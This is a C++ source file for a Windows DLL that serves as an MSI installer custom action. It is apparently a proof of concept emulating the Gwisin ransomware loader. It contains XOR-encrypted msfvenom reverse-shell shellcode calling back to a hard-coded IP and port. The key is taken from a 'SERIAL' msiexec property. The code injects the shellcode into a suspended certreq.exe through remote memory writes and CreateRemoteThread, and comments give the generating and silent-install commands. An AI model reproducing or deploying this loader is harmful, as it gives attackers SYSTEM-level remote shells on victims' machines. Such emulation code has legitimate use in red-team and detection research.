#include <pch.h>
#include <windows.h>
#include <msi.h>
#include <stdio.h> 
#include <Msiquery.h> 
#pragma comment(lib, "msi.lib")

// Project > Project properties > c/c++ > preprocessor > processor definition - _CRT_SECURE_NO_WARNINGS 
// Project > Project properties > Charset > Multi-byte 

// msiexec -> notepad -> msiexec and notepad both dies with werfault -> rundll32, cmd, connhost becomes orphan - NOT even under explorer.exe! It's just running as SYSTEM 
// injecting to notepad gives SYSTEM context 
// injecting to certreq gives user context ? 

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

extern "C" __declspec(dllexport) UINT __stdcall GwisinCustom(MSIHANDLE hInstall) {
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startupInfo;
	BOOL creationResult;

	// Every change requires deleting/re-adding dll to the msi 
	// meterpreter doesn't work, but shell_reverse_tcp does. Not sure? bad byte?  
	// msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.40.182 lport=8443 exitfunc=thread --encrypt xor --encrypt-key "serialmorelikecereal"  -f c
	// msiexec.exe /qn /i <msi-filepath> SERIAL=serialmorelikecereal
	unsigned char buf[] =
		"\x8f\x2d\xf1\x8d\x91\x84\xa1\x6f\x72\x65\x2d\x38\x2a\x35\x31"
		"\x34\x24\x2d\x50\xbe\x16\x2d\xf9\x3b\x01\x24\xe6\x3d\x6a\x2d"
		"\xe7\x3b\x4b\x2d\xe8\x17\x22\x2d\x6e\xdb\x39\x2f\x3f\x58\xa8"
		"\x24\x5c\xaf\xde\x59\x0d\x15\x69\x49\x43\x24\xb3\xac\x6c\x2d"
		"\x72\xa4\x90\x84\x33\x24\xe6\x3d\x52\xee\x2e\x55\x2a\x34\x2b"
		"\x64\xa2\x03\xe0\x14\x6b\x6e\x70\x66\xe4\x1e\x6d\x6f\x72\xee"
		"\xec\xe1\x6b\x65\x63\x2d\xf7\xa5\x15\x0b\x3b\x64\xa2\x39\xea"
		"\x24\x75\x2b\xf9\x25\x4c\x20\x6a\xb5\x80\x33\x3f\x54\xa8\x24"
		"\x8c\xac\x33\xe2\x55\xe4\x25\x6e\xa4\x2d\x5d\xa9\xc7\x24\xa2"
		"\xac\x7f\x24\x60\xad\x4b\x85\x07\x98\x2d\x6f\x21\x4b\x7a\x20"
		"\x55\xb8\x1e\xbd\x3b\x21\xf9\x25\x45\x25\x72\xb5\x14\x28\xea"
		"\x60\x25\x2b\xf9\x25\x70\x20\x6a\xb5\x22\xee\x76\xed\x20\x34"
		"\x32\x3d\x3a\x68\xb1\x32\x34\x35\x33\x3d\x2d\x30\x2a\x3f\x2b"
		"\xe6\x9e\x45\x20\x3e\x8c\x85\x2a\x28\x38\x36\x25\xe4\x60\x8c"
		"\x27\x96\x94\x9a\x3e\x2c\xcc\x12\x12\x5e\x2c\x56\x40\x69\x61"
		"\x2d\x3b\x26\xfb\x83\x24\xe8\x87\xc5\x62\x65\x72\x2c\xe8\x89"
		"\x3a\xd9\x70\x69\x41\x97\xad\xc7\x5a\xd3\x2d\x3d\x22\xec\x87"
		"\x29\xfb\x94\x20\xd6\x3f\x12\x54\x6e\x9e\xb9\x21\xe6\x98\x0d"
		"\x6d\x68\x6b\x65\x3a\x24\xc8\x4c\xe1\x07\x73\x9a\xa7\x03\x6b"
		"\x2d\x33\x3f\x22\x28\x5d\xa0\x26\x54\xa3\x2d\x8d\xa5\x29\xe5"
		"\xb1\x2d\x8d\xa9\x29\xe5\xac\x2e\xc8\x8f\x63\xb6\x8b\x9a\xb6"
		"\x2d\xfb\xa2\x0b\x7c\x32\x3d\x3e\xe0\x83\x24\xe4\x96\x33\xdf"
		"\xf5\xcc\x1f\x04\x9c\xb0\xf7\xa5\x15\x66\x3a\x9a\xbc\x1c\x84"
		"\x84\xfe\x6f\x72\x65\x24\xea\x87\x75\x2b\xec\x90\x28\x50\xa5"
		"\x19\x61\x33\x31\x29\xe5\x94\x2e\xc8\x67\xb5\xa1\x34\x9a\xb6"
		"\xe6\x8a\x65\x1f\x39\x3b\xe6\xb6\x49\x3f\xe5\x9b\x05\x32\x24"
		"\x35\x01\x6b\x75\x63\x65\x33\x3d\x29\xe5\x81\x2d\x43\xa0\x20"
		"\xd6\x35\xcb\x21\x80\x93\xbc\x23\xec\xa0\x2c\xfb\xa2\x2c\x5d"
		"\xba\x2c\xfb\x99\x29\xe5\xb7\x27\xfb\x9c\x2d\xd3\x69\xbc\xab"
		"\x3a\x8d\xb0\xe2\x94\x73\x18\x5a\x31\x20\x3b\x34\x07\x72\x25"
		"\x6c\x69\x2a\x3d\x09\x65\x28\x24\xdb\x67\x5c\x6a\x42\x96\xb4"
		"\x3b\x34\x2e\xc8\x10\x02\x24\x0a\x9a\xb6\x2c\x8d\xab\x88\x50"
		"\x8c\x9a\x8d\x21\x60\xaf\x25\x46\xb4\x2d\xe9\x9f\x1e\xd1\x22"
		"\x9a\x95\x3d\x0b\x6c\x2a\xde\x92\x74\x4b\x66\x2c\xe6\xa8\x9a"
		"\xb9";

	char msiPropValue[256];
	DWORD msiPropLength = 256;

	//// Get custom action data from commandline. ex) msiexec /qn /i <msi-path> SERIAL=<serial> LICENSE=<license> 
	MsiGetProperty(hInstall, TEXT("CustomActionData"), msiPropValue, &msiPropLength);

	char* tSerial = strtok((char*)msiPropValue, " ");
	char* tLicense = strtok(NULL, "");

	// Serial value from msiexec commandline. Used as xor key for shellcode decryption. 
	char* serial = strtok((char*)tSerial, "=");
	char* serialValue = strtok(NULL, "");

	// License value is ignored in this PoC.
	char* license = strtok((char*)tLicense, "=");
	char* licenseValue = strtok(NULL, "");

	// Decrypt shellcode with serial value. +1 because null terminator at the end 
	XOR((char*)buf, sizeof(buf), serialValue, strlen(serialValue) + 1);

	STARTUPINFO si;
	si.cb = sizeof(si);
	ZeroMemory(&si, sizeof(si));

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	// Certreq because Gwisin used it. No window + suspended for no gui. 
	CreateProcess("C:\\windows\\system32\\certreq.exe", NULL, 0, 0, FALSE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, "C:\\Windows\\system32", &si, &pi);

	DWORD pid = pi.dwProcessId;
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID pAlloc = VirtualAllocEx(hProc, nullptr, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	SIZE_T bytesWritten;
	WriteProcessMemory(hProc, pAlloc, buf, sizeof(buf), &bytesWritten);
	DWORD flProtect = 0;
	VirtualProtectEx(hProc, pAlloc, sizeof(buf), PAGE_EXECUTE_READ, &flProtect);
	//Sleep(20000); // debug
	HANDLE rThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pAlloc, NULL, 0, NULL);

	return 0;
}

extern "C" __declspec(dllexport) HRESULT DllRegisterServer() {
	return 0;
}

extern "C" __declspec(dllexport) HRESULT DllUnregisterServer() {
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}